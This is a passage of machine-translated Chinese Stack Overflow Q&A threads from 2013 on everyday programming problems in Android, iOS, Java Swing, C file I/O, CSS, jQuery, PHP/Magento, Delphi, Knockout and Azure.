        Func<List<object>, List<object>, Func<string, object>> test = Test;

    }

    private static Func<string, object> Test(List<object> objects, List<object> list)
    {
        throw new NotImplementedException();
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:42:57.080

我不知道你想要什么，但是这个编译和工作：

```
public void SomeMethod()
{
    Func<List<object>, List<object>, Func<string, object>> test = (a, b) => 
    {
        a = b;
        return AnotherMethod;
    };
}

public object AnotherMethod(string value)
{
    return (object)value;
} 
```

# android - Android：需要 ViewPager？

> ID：14903618
> 
> 赞同：1
> 
> 时间：2013-02-15T21:29:28.227
> 
> 标签：android, android-viewpager

我想制作一个布局，您可以在其中左右滑动以更改视图内容。但是，我不需要更改布局，我只需要更改 TextViews 中的文本，并在向右或向左滑动时更改一些可见性。我需要一个 ViewPager 吗？如果是的话，你能给我一个例子的链接吗？我只是有点迷路，我不知道用谷歌搜索什么（这是谷歌唯一无法帮助你解决的问题：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:55:42.830

如果您只想更改文本，[请](http://developer.android.com/reference/android/support/v4/view/ViewPager.html)查看[TextSwitcher](http://developer.android.com/reference/android/widget/TextSwitcher.html)甚至[ViewSwitcher](http://developer.android.com/reference/android/widget/ViewSwitcher.html)你肯定会找到很多。

# objective-c - 将登录 ViewController 放在 Storyboard 中的什么位置？

> ID：14903619
> 
> 赞同：2
> 
> 时间：2013-02-15T21:29:40.093
> 
> 标签：objective-c, cocoa-touch, uiviewcontroller, storyboard, appdelegate

如果我想要一个 MainViewController，那么 Xcode 中最好的方法是什么，它仅在用户登录时显示，否则会显示一个 LoginViewController，并且在（成功）登录 MainViewController 之后。

**首先关注故事板：**

*   (a) 有一个 LoginViewController（作为初始视图控制器），然后是 MainViewController
*   (b) 拥有 MainViewController（作为初始视图控制器）和到 LoginViewController 的连接，如果用户未登录，将使用该连接
*   (c) 与 (a) 类似，但在 NavigationController 中嵌入

或者还有其他可能吗？

**专注于代码逻辑：** 应该在 AppDelegate 或 Login- 各自的 MainViewController 中处理

如果有人有示例代码，那就太好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:48:27.420

（C）

我通常将 LoginVC 作为初始 VC。

*   从逻辑上讲，已经登录的用户是“登录用例”的一个特殊子案例。因此，将其作为起点是有意义的。
*   将 LoginVC 作为导航层次结构的基础也可以很容易地使用 注销`popToViewController:animated`，无论它们在导航堆栈中的哪个位置。

处理从 LoginVC 内部的转换到 MainVC，而不是应用程序委托。这样，您将拥有一组代码来进行转换，唯一的区别是在一种情况下用户提供凭据，而在另一种情况下，凭据被缓存。

确认凭据后，使用您的 segue 移动到 MainVC：

```
[self performSegueWithIdentifier:@"MainVCViewSegue" sender:nil]; 
```

# java - Android 文件浏览器抛出 IO 异常？

> ID：14903623
> 
> 赞同：1
> 
> 时间：2013-02-15T21:30:01.207
> 
> 标签：java, android, file, audio, browser

以下代码引发 IO 异常。有任何想法吗？此代码用于文件浏览器，作为音乐制作应用程序的一部分，我想向用户展示他们在文件夹（资产）中有哪些音频循环。

```
package com.razor5cl.droiddub;

import android.app.ListActivity;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.Bundle;

public class BrowserActivity extends ListActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_browser);
        Intent intent = getIntent();
        String button = intent.getStringExtra("id");

        AssetManager assetManager = getAssets();
        String[] fileNames =assetManager.list("loops");

    }
} 
```

[编辑] 抱歉耽搁了伙计们。这也是承诺的 XML 代码：

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center_horizontal"
    android:orientation="vertical"
    android:background="#111111"
    tools:context=".MainActivity"
    >

        <ListView
            android:id="@+id/list"
            android:layout_width="wrap_content"
            android:layout_height="467dp" />

   <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center_horizontal"
    android:orientation="horizontal"
    android:background="#111111"
    tools:context=".MainActivity"
    >   
        <Button
            android:layout_width="100dip"
            android:layout_height="50dip"
            android:text="@string/preview_text"
            android:textSize="20sp"
            android:id="@+id/preview_button"
            android:layout_marginRight="10dip"
            />

        <Button
            android:layout_width="100dip"
            android:layout_height="50dip"
            android:text="@string/select_text"
            android:textSize="20sp"
            android:id="@+id/select_button"
            android:layout_marginLeft="10dip"
            />

</LinearLayout>
</LinearLayout> 
```

还有一个堆栈跟踪：

```
02-24 10:04:42.445: E/AndroidRuntime(10029): FATAL EXCEPTION: 02-24 10:04:42.445: E/AndroidRuntime(10029): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.razor5cl.droiddub/com.razor5cl.droiddub.BrowserActivity}:    java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2180)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread.access$600(ActivityThread.java:141)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1234)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.os.Handler.dispatchMessage(Handler.java:99)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.os.Looper.loop(Looper.java:137)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread.main(ActivityThread.java:5041)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at java.lang.reflect.Method.invokeNative(Native Method)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at java.lang.reflect.Method.invoke(Method.java:511)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at dalvik.system.NativeStart.main(Native Method)
02-24 10:04:42.445: E/AndroidRuntime(10029): Caused by: java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ListActivity.onContentChanged(ListActivity.java:243)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:273)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.Activity.setContentView(Activity.java:1881)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at com.razor5cl.droiddub.BrowserActivity.onCreate(BrowserActivity.java:21)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.Activity.performCreate(Activity.java:5104)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1080)
02-24 10:04:42.445: E/AndroidRuntime(10029):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2144)
02-24 10:04:42.445: E/AndroidRuntime(10029):    ... 11 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:56:59.383

你需要设置列表视图

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
    android.R.layout.simple_list_item_1, fileNames );
setListAdapter(adapter); 
```

例如，请查看[http://www.vogella.com/articles/AndroidListView/article.html](http://www.vogella.com/articles/AndroidListView/article.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:56:59.587

根据您的评论例外 - 您正在实施 ListActivity，但您的布局中没有 ListView。要么添加一个 id 为 android:id.list 的列表，要么从 Activity 派生而不是 ListActivity。

# java - 如何在 JTable 中呈现 JTable？

> ID：14903629
> 
> 赞同：4
> 
> 时间：2013-02-15T21:30:29.670
> 
> 标签：java, swing, user-interface, jtable, nested

我正在尝试将 JTable 嵌套在另一个 JTable 的列中（使用 CellRenderer）。

示例（错误）输出：

![在此处输入图像描述](../Images/0ca660cf2ac069bcca81572e914cef9e.png)

为什么下面的例子不输出表中的表？

```
import java.awt.Component;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableCellRenderer;

public class Test {

    public static void main(String[] args) {
        JTable table = new JTable(new CustomTableModel());
        table.setDefaultRenderer(Person.class, new CustomRenderer());
        JPanel panel = new JPanel();
        panel.add(new JScrollPane(table));
        JFrame frame = new JFrame();
        frame.setContentPane(panel);
        frame.pack();
        frame.setVisible(true);
    }
}

@SuppressWarnings("serial")
class CustomTableModel extends AbstractTableModel {

    @Override
    public int getColumnCount() {
        return 2;
    }

    @Override
    public int getRowCount() {
        return 1;
    }

    @Override
    public Object getValueAt(int row, int col) {
        if (col == 0) {
            return new Person("Bob");
        } else {
            return "is awesome!";
        }
    }
}

@SuppressWarnings("serial")
class CustomRenderer extends JPanel implements TableCellRenderer {

    @Override
    public Component getTableCellRendererComponent(JTable table, Object value,
            boolean isSelected, boolean hasFocus, int row, int col) {
        JTable t = new JTable(new CustomTableModel());
        add(new JScrollPane(t));
        return this;
    }
}

class Person {

    public String name = "";

    public Person(String name) {
        this.name = name;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:38:03.063

不要将子表添加到滚动窗格。相反，尝试将表格添加到具有 BorderLayout 的 JPanel 的中心位置，然后将表格标题添加到 NORTH 位置

这样做的主要原因是滚动窗格不会是交互式的，并且可能会隐藏数据

**更新**

我在打电话，所以很难阅读代码：P

在您的主表模型中，您需要重写 getColumnClass 方法并确保您正在为所需列重新调整 Person.class（以及其他列的正确类类型）

# c++ - 在 C 中检测 fwrite 上的磁盘移除

> ID：14903631
> 
> 赞同：0
> 
> 时间：2013-02-15T21:30:34.970
> 
> 标签：c++, c, linux, file-io

我正在编写一个应用程序来连续向驱动器写入和读取文件（无论是硬盘驱动器还是 SD 卡或其他）。我正在编写某种模式，然后将其读回作为验证。一旦应用程序失败，我想立即输出某种刺耳的错误。基本上，我们正在用辐射击中硬件，并且需要检测它何时发生故障。到目前为止，我的应用程序可以很好地读取和写入文件，但可以在执行过程中拉出 SD 卡，并且它会继续运行，就好像它还在那里一样。我真的需要检测 SD 卡被移除的那一刻。我看到一些建议使用libudev。我不能使用它，因为这是在没有它的嵌入式 linux 系统上。这是我到目前为止的代码：

```
#include <stdio.h>
#include <time.h>

const unsigned long long size = 16ULL*1024;
#define NANOS 1000000000LL
#define KB 1024

long long CreateFile(char* filename)
{
    struct timespec time_start;
    struct timespec time_stop;
    long long start, elapsed, microseconds;
    int timefail = 0;
    size_t stat;

    if(clock_gettime(CLOCK_REALTIME, &time_start) < 0)
        timefail = 1;
    start = time_start.tv_sec*NANOS + time_start.tv_nsec;

    int a[size];
    int i, j;

    for(i=0;i<size;i++)
        a[i] = i;

    FILE* pFile;
    pFile = fopen(filename, "wb");
    if(pFile < 0)
    {
        perror("fopen");
        return -1;
    }
    for(j=0; j < KB; j++)
    {
        stat = fwrite(a, sizeof(int), size, pFile);
        if(stat < 0)
            perror("fwrite");
        stat = fsync(pFile);
        //if(stat)
        //  perror("fysnc");
    }

fclose(pFile);

    if(clock_gettime(CLOCK_REALTIME, &time_stop) < 0)
        timefail = 1;

    elapsed = time_stop.tv_sec*NANOS + time_stop.tv_nsec - start;
    microseconds = elapsed / 1000 + (elapsed % 1000 >= 500);

    if(timefail)
        return -1;

    return microseconds / 1000;
}

long long ReadFile(char* filename)
{
    struct timespec time_start;
    struct timespec time_stop;
    long long start, elapsed, microseconds;
    int timefail = 0;

    if(clock_gettime(CLOCK_REALTIME, &time_start) < 0)
        timefail = 1;
    start = time_start.tv_sec*NANOS + time_start.tv_nsec;

    FILE* pFile;
    pFile = fopen(filename, "rb");

    int a[KB];
    int i=0, j=0;
    for(i=0; i<size; i++)
    {
        if(ferror(pFile) != 0)
        {
            fprintf(stderr, "**********************************************");
            fprintf(stderr, "READ FAILURE\n");
            fclose(pFile);
            return -1;
        }
        fread(a, sizeof(a), 1, pFile);
        for(j=0; j<KB;j++)
        {
            if(a[0] != a[1]-1)
            {
                fprintf(stderr, "**********************************************");
                fprintf(stderr, "DATA FAILURE, %d != %d\n", a[j], a[j+1]-1);
                fclose(pFile);
                return -1;
            }
        }
    }
    fclose(pFile);
    if(clock_gettime(CLOCK_REALTIME, &time_stop) < 0)
            timefail = 1;

    if(timefail)
        return -1;

    elapsed = time_stop.tv_sec*NANOS + time_stop.tv_nsec - start;
    microseconds = elapsed / 1000 + (elapsed % 1000 >= 500);

    return microseconds/1000;
}

int main(int argc, char* argv[])
{
    char* filenamebase = "/tmp/media/mmcblk0p1/test.file";
    char filename[100] = "";
    int i=0;
    long long tmpsec = 0;
    long long totalwritetime = 0;
    int totalreadtime = 0;
    int numfiles = 10;
    int totalwritten = 0;
    int totalread = 0;

    for(i=0;i<numfiles;i++)
    {
        sprintf(filename, "%s%d", filenamebase, i);
        fprintf(stderr, "Writing File: %s ...", filename);
        tmpsec = CreateFile(filename);
        if(tmpsec < 0)
            return 0;
        totalwritetime += tmpsec;
        totalwritten++;
        fprintf(stderr, "completed in %lld seconds\n", tmpsec);
        fprintf(stderr, "Reading File: %s ...", filename);
        tmpsec = ReadFile(filename);
        if(tmpsec < 0)
            return 0;
        totalreadtime += tmpsec;
        totalread++;
        fprintf(stderr, "completed in %lld seconds\n", tmpsec);
    }

    fprintf(stderr, "Test Complete\nTotal Files: %d written, %d read\n", totalwritten, totalread);
    fprintf(stderr, "File Size: %lld KB\n", size);
    fprintf(stderr, "Total KBytes Written: %lld\n", size*totalwritten);
    fprintf(stderr, "Average Write Speed: %0.2f KBps\n", (double)size*totalwritten/(totalwritetime/1000));
    fprintf(stderr, "Total KBytes Read: %lld\n", size*totalread);
    fprintf(stderr, "Average Read Speed: %0.2f KBps\n", (double)size*totalread/(totalreadtime/1000));

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:54:51.610

你需要改变你的方法。

如果你拉出已经挂载的媒体，你可能会惊慌你的内核（因为它在内存中保留了代表挂载文件系统的复杂数据结构），并破坏了媒体本身。

我已经用这种方式销毁了很多 USB 记忆棒——它们处理分配和磨损均衡的内部小逻辑不喜欢在运行中断电，而且最便宜的似乎没有能够提供足够电力的电容器让它们运行足够长的时间以确保一致的状态——但 SD 卡和更昂贵的 USB 记忆棒可能会更好地生存。

根据使用的驱动程序，内核可能允许您读取和写入媒体，但只需将更改保存在页面缓存中。（此外，您的 stdio.h I/O 可能只进入页面缓存，而不是实际的媒体，这取决于安装选项（是否直接/同步安装）。您的方法根本不提供您的行为假设确实如此。）

相反，您应该使用低级 I/O（unistd.h，参见[man 2 open](http://man7.org/linux/man-pages/man2/open.2.html)和相关调用，没有 stdio.h），使用`O_RDWR|O_DIRECT|O_SYNC`标志来确保您的读写命中硬件，*并直接访问原始媒体*通过块设备节点，而不是安装它。您还可以读取/写入设备上的随机位置，希望磨损均衡不会过多影响您的抗辐射检查。

（编辑添加：如果您在块中写入与测试媒体设备的本机分配块大小完全相同的块，您将避免设备上缓慢的读取 - 修改 - 写入周期。设备仍然会进行磨损均衡，但是只是意味着你写入的块在闪存芯片中的随机物理位置。本机块大小取决于媒体设备。可以通过观察读取和写入需要多长时间来测量本机块大小一个不同大小的块，但我认为对于损坏测试，两个足够大的幂应该效果最好——比如 256k 或 262144 字节。最好让用户为每个设备单独设置它，并使用制造商提供的任何一个信息，或单独的测试程序来找出正确的值。）

您不想为此使用`mmap()`，因为由媒体错误和媒体变得不可用引起的 SIGBUS 信号很难正确处理。在我看来，低级 unistd.h I/O 最适合这个。

我相信，但尚未验证，将中间读/写的媒体拉出到未安装的低级设备，应该只会产生读/写错误。（不过，我现在没有任何愿意冒险检查的媒体：）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T22:06:42.390

从我的评论中回答：

在您的写入功能中，您应该具有：

```
for(j=0; j < KB; j++)
{
    uint32_t bytes_written = fwrite(a, sizeof(int), size, pFile);
    if(bytes_written < size)
    {
        perror("fwrite");
        break;
    }
    stat = fsync(pFile);
    if(stat < 0)
    {
        perror("fysnc");
        break;
    }
} 
```

并在您的阅读功能中：

```
uint32_t read_bytes_count = fread(a, sizeof(a), 1, pFile);
if(read_bytes_count < sizeof(a))
    break; 
```

此外，如果您有 C99 编译器，请使用 中可用的固定大小类型`stdint.h`，例如：uint32_t，...

# html - 消除大纲级别的默认 CSS

> ID：14903633
> 
> 赞同：1
> 
> 时间：2013-02-15T21:30:50.173
> 
> 标签：html, css

H 大纲级别具有默认格式。出于可访问性的原因，我需要将大纲级别严格用于它们的大纲功能，而不是它们的样式。如何消除大纲级别的 CSS 属性，以便它们不会覆盖我放入的 div？

```
<div align="center" class="certTitle">
    <h1>Request History</h1>
</div> 
```

此代码导致文本太大、字体错误，并增加了 div 的大小以适应 h1 样式中的边距。它覆盖了我的 certTitle 样式。

是的，我可以使用 h6，但这并不能回答页边距、字体或其他问题。

我也不能简单地设置 H 元素的样式：

```
<div align="center" class="certTitle">
    <h1 class="certTitle">Request History</h1>
</div> 
```

因为样式有一个框边框，这给了我嵌套的框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:56:56.307

[在https://github.com/necolas/normalize.css](https://github.com/necolas/normalize.css)使用 CSS 重置，例如 normalize.css

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:51:40.443

查看可以帮助您的 CSS 重置。

# jquery - 在一页上实现多个 jQuery 插件

> ID：14903635
> 
> 赞同：2
> 
> 时间：2013-02-15T21:31:01.917
> 
> 标签：jquery, jquery-plugins

我是 jquery 的新手，正在尝试让多个插件在一页上运行。现在我正在使用一个独立工作的动画 div 滑块，以及一个独立工作的页面内的动画链接。我可以禁用一个，另一个将起作用。我已经尝试过 $.noConflict(); 但它只是打破了两者。这是我的代码。

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"        type="text/javascript"></script> 
<script src="js/jquery.localscroll.js" type="text/javascript"></script> 
<script src="js/jquery.scrollTo.js" type="text/javascript"></script> 

<link rel="stylesheet" type="text/css" media="screen" href="css/coda-slider.css">

<script src="js/jquery-1.7.2.min.js"></script>
<script src="js/jquery-ui-1.8.20.custom.min.js"></script>
<script src="js/jquery.coda-slider-3.0.js"></script>

<script>
  $(function() {
  $('#slider-id').codaSlider({
    dynamicTabsAlign: "left",
      dynamicArrows: true,
      autoSlide: true,
      slideEaseDuration: 1000,
      autoSlideInterval:8000,
      dynamicArrowsGraphical:true
  });
});

</script>

<script type="text/javascript">
$(document).ready(function() {
   $('#navcontact').localScroll({duration:800});
});
</script> 
```

我曾尝试使用许多其他问题，但似乎无法让它们发挥作用。

请帮忙

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-15T21:33:06.863

删除这一行：

```
<script src="js/jquery-1.7.2.min.js"></script> 
```

jquery 库应该只加载一次，不管是什么版本。如果您再次加载它，则在上次添加之前添加的任何插件都将不可用。

由于您正在加载版本 1.4 和 1.7，您可能希望将上面的行移至文件顶部并删除对的调用`<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"`（也未正确关闭），因为您的某些插件可能至少需要版本1.7.

# php - JSON PHP 数组解码 - 访问特定数据

> ID：14903637
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:31:08.000
> 
> 标签：php, json, decode

我不知道如何在这个 JSON 数据中回显“标签”。

```
{"totalHits":26,"hits":[{"previewHeight":92,"tags":"sunflower, sunflower field, flora"}]}; 
```

我可以使用这个来回显“totalHits”：

```
$json = file_get_contents($url);
$obj = json_decode($json);
echo $obj->totalHits; // 26 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:33:12.883

以可读格式查看您的 JSON

```
{
    "totalHits": 26,
    "hits": [{
        "previewHeight": 92,
        "tags": "sunflower, sunflower field, flora"
    }]
}; 
```

我们可以看到这`tags`是`hit`对象的一个​​属性

并且是一个包含对象`$obj->hits`的数组`hit`

所以...

```
echo $obj->hits[0]->tags; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:37:21.207

我强烈建议您使用**`print_r`**它来让您更轻松地跟踪数组

的输出`print_r($obj);`

```
stdClass Object
(
    [totalHits] => 26
    [hits] => Array
        (
            [0] => stdClass Object
                (
                    [previewHeight] => 92
                    [tags] => sunflower, sunflower field, flora
                )

        )

) 
```

所以你的对象可以像这样访问

```
echo $obj->hits[0]->tags; 
```

# php - 如何获取 Magento 客户 ID

> ID：14903646
> 
> 赞同：26
> 
> 时间：2013-02-15T21:32:01.230
> 
> 标签：php, magento

啊，我如何获得客户ID！？这些都是我尝试过的！你能看出我做错了什么吗？

```
//include_once "app/Mage.php";
require_once '/home/ab71714/public_html/app/Mage.php';

//Mage::app("default");

Mage::app()->setCurrentStore(Mage_Core_Model_App::ADMIN_STORE_ID);

if($customer = Mage::getSingleton('customer/session')->isLoggedIn()) {
    $customerData = Mage::getModel('customer/customer')->load($customer->getId())->getData();
    print_r($customerData);
    echo $customerData->getId();
}

//$customerData = Mage::getModel('customer/customer');
//$customerID = $customerData -> getId(); 

//$userinfo = $customerData->_origData; // fetch users info
$customerID=$customer -> getId(); 
//$customerID = $customerData->getEntityId();
//$customerID = $customerData[entity_id]; 
```

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2013-02-15T23:20:05.980

尝试

```
 if(Mage::getSingleton('customer/session')->isLoggedIn()) {
     $customerData = Mage::getSingleton('customer/session')->getCustomer();
      echo $customerData->getId();
 } 
```

查看[Magento 中的当前用户？](https://stackoverflow.com/questions/416553/current-user-in-magento)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-06-21T13:12:08.527

最快的方法是

```
Mage::getSingleton('customer/session')->getId() 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-15T21:37:43.557

该函数`isLoggedIn`将只返回一个关于客户是否登录的布尔值，而不返回其他信息。

客户会话确实具有以下功能：

1.  `getCustomerId`: 这将返回客户 ID

2.  `getCustomer`: 这将返回客户对象。

# delphi - 在 Delphi TListView 中移动 SubItemImages 的错误水平位置？

> ID：14903647
> 
> 赞同：3
> 
> 时间：2013-02-15T21:32:04.430
> 
> 标签：delphi, listview, delphi-xe2, subitem

在 Delphi`TListView`中，是否可以移动 SubItemImages 的错误水平位置，因为它们画得太左了？像这样的东西，例如（伪代码，它只是表明意图）：

```
x := MyListView.Items[i].SubItemImages[2].HorizontalPosition;
MyListView.Items[i].SubItemImages[2].HorizontalPosition := x + 2; 
```

此屏幕截图显示了该错误：

![在此处输入图像描述](../Images/6ac33802170b8ae9c61662e7c9d7c946.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T23:02:17.420

No.[`TListItem.SubItemImages`](http://docwiki.embarcadero.com/Libraries/XE3/en/Vcl.ComCtrls.TListItem.SubItemImages)是整数，整数没有水平位置。

```
property SubItemImages[Index: Integer]: Integer read GetSubItemImage 
  write SetSubItemImage; 
```

您可以通过查看 VCL 源代码（在本例中为`ComCtrls`单元）找到这一点。相关代码在`TListItem.GetSubItemImage`（下图来自XE3的代码，但与之前版本的Delphi中的代码相同）。

```
function TListItem.GetSubItemImage(Index: Integer): Integer;
begin
  Result := TSubItems(FSubItems).ImageIndex[Index];
end; 
```

据我从[MSDN 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ff485973%28v=vs.85%29.aspx)中可以看出，无法更改该图像的位置。这些列是通过向底层 Windows`ListView`控件发送[`LVCOLUMN`](http://msdn.microsoft.com/en-us/library/windows/desktop/bb774743%28v=vs.85%29.aspx)每个列定义的记录（结构）来创建的，其中没有可分配的位置信息。它有一个标志来设置图像右对齐 ( `LVCFMT_BITMAP_ON_RIGHT`)，但没有其他东西可以让您将图像实际定位到列中的特定位置。

# knockout.js - 不带任何参数调用 ko.applyBindings 是否安全？

> ID：14903650
> 
> 赞同：1
> 
> 时间：2013-02-15T21:32:54.197
> 
> 标签：knockout.js

这是我可以在 ko.applyBindings() 上找到的唯一官方文档：

[http://knockoutjs.com/documentation/observables.html](http://knockoutjs.com/documentation/observables.html)

这不是一份真正的正式书面文件，它准确地说明了什么是可选的/等。在测试中，调用 ko.applyBindings() 似乎允许在全局范围内进行绑定，并且看起来工作正常。有没有人研究过源代码（或者比我更了解 KO），知道这是否安全？有性能问题吗？

这是我正在处理的 SPA 的“应用程序”对象的开始：

```
var app = {

self: this,
datacontext: new DataContext(),
dataservice: new DataService(),
viewModels: {
    main: new MainViewModel(),
    folderDetails: new FolderDetailsViewModel()
},

init: function() {

    ko.applyBindings();

    Sammy(function() {

        this.get('#:folder', function() {
            self.doFolderRoute(this.params.folder);
        });

        // Override this function so that Sammy doesn't mess with forms
        this._checkFormSubmission = function(form) {
            return (false);
        };

    }).run();

},

doFolderRoute: function(id) {
    console.log("doFolderRoute: " + id);
}
} 
```

我可以做 ko.applyBindings(self.viewModels)，将数据绑定限制到模型......但我有点喜欢能够绑定到任何东西的自由，并且不介意（甚至喜欢）输入应用程序。 viewModels.main 在我的代码中，而不是“main”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:56:43.257

通过使用`ko.applyBindings()`，Knockout 不会知道您的视图模型。`$root`不会被设置，也不会`$data`在根级别。显然，您不能简单地不引用这些变量。事件绑定也传递`$data`给事件处理函数，在本例中为`undefined`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:06:25.967

仅供参考 - 这是我更新的应用程序（显然仍在进行中）：

我发现 self：我在原始代码中的 this 指向窗口，所以显然这是一个坏主意，也是我在尝试 ko.applyBindings(self.viewModels) 时得到奇怪结果的原因之一。

```
var app = {

datacontext: new DataContext(),
dataservice: new DataService(),
viewModels: {
    main: new MainViewModel(),
    folderDetails: new FolderDetailsViewModel()
},

init: function() {

    ko.applyBindings(app.viewModels);

    Sammy(function() {

        this.get('#:folder', function() {
            self.doFolderRoute(this.params.folder);
        });

        // Override this function so that Sammy doesn't mess with forms
        this._checkFormSubmission = function(form) {
            return (false);
        };

    }).run();

    widgetLib.init();

},

doFolderRoute: function(id) {
    console.log("doFolderRoute: " + id);
}
} 
```

# c# - 从 Azure 网站访问 Couchbase

> ID：14903658
> 
> 赞同：0
> 
> 时间：2013-02-15T21:33:16.317
> 
> 标签：c#, azure, asp.net-mvc-4, couchbase

我创建了一个连接访问 Couchbase 2.0 服务器的 MVC4 应用程序（安装在其他地方的虚拟机上）。在我的开发环境中，它工作正常，但是当该站点在 Azure 网站上发布时，它无法再访问 Couchbase。Couchbase 2.0 在端口 8091 上的 rest 接口上访问。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-19T06:19:16.043

答案是 ：

1.  当应用程序部署为 Azure 网站时，它不起作用。

2.  访问外部 Couchbase 服务器与部署为 webrole 的应用程序一起工作。

感谢您的帮助。

# html - 如何将未知长度的 div 水平居中并使用最小宽度？

> ID：14903662
> 
> 赞同：0
> 
> 时间：2013-02-15T21:33:26.253
> 
> 标签：html, css

我正在更新旧网站上的一些遗留代码，而 CSS 是一场噩梦。我想要做的就是让包含用户名的 div 在需要时扩展一点，并保持外部 div 在页面上居中（水平）。myLabel 控件是根据用户名填充的（通常未预定义为 John Doe）。

目前，在 myContainer 上的 800px 值和 myGridB 上的 350px 值之间，较长的用户名包裹在 div 中。我宁愿在一行上显示长名称，并且尽可能不要将其他控件撞到下一行。

我尝试在 myContainer 和 myGridB 上使用 min-width ，但这只是允许 div 在整个页面上展开。我看到这是[这个问题](https://stackoverflow.com/questions/4567900/why-is-my-width-at-100)中 div 的常见行为。

我也尝试了[其他问题](https://stackoverflow.com/questions/198153/why-does-the-css-min-width-attribute-not-force-a-div-to-have-the-specified-minim)中的一些方法，但这将我的标题内容推到了左边，我需要它居中。

我意识到这段代码是乱码，但我很感激任何想法……</p>

aspx：

```
<div class="myLogo1">
    <div class="myContainer" style="width: 800px">
        <div class="myGridC myLogo2 first">
            <a onclick="loadMyHomePage(); "><img src="myImageAddress" /></a>
        </div>
        <div class="myGridB first last">
            <div class="myHome myGridB first last">
                <asp:Label runat="server" CssClass="myHome" ID="myLabel">
                    John Doe
                </asp:Label>
                <span class="myHome">
                    <asp:HyperLink NavigateUrl="mySettingsPage.aspx" runat="server">
                        My Settings
                    </asp:HyperLink>
                </span>
                <a href="myLogoutPage.aspx") %>">
                    <img src="myLogout.jpg") %>" alt="Logout" />
                </a>
            </div>
            <div class="myGridB first last">
                <div class="myGridA myPaddingA myHome">
                    <a href="myOtherPage" target="_blank">
                        <img width="180px" height="72px" src="myOther.jpg" />
                    </a>
                </div>
            </div>
        </div>
    </div>
</div> 
```

CSS：

```
.myLogo1
{
    background-color: #363636; /* #000000; */
    width: 100%;
    height: 125px;
}
.myContainer
{
    margin-left: auto;
    margin-right: auto;
    width: 960px;
}
.myGridA, .myGridB, .myGridC {
    display: inline;
    float: left;
    margin-left: 5px;
    margin-right: 5px;
}
.myGridA
{
    width: 190px;
}
.myGridB
{
    width: 350px;
}
.myGridC
{
    width: 390px;
}
.myLogo2
{
    border: none 0px transparent;
    padding-top: 10px;
}
.first
{
    margin-left: 0;
}
.last
{
    margin-right: 0;
}
.myHome
{
    text-align: right;
    display: block;
    vertical-align: top;
    float: right;
    position: relative;
    font-size: 9pt;
}

.myHome span
{
    font-size: 9pt;
    float: left;
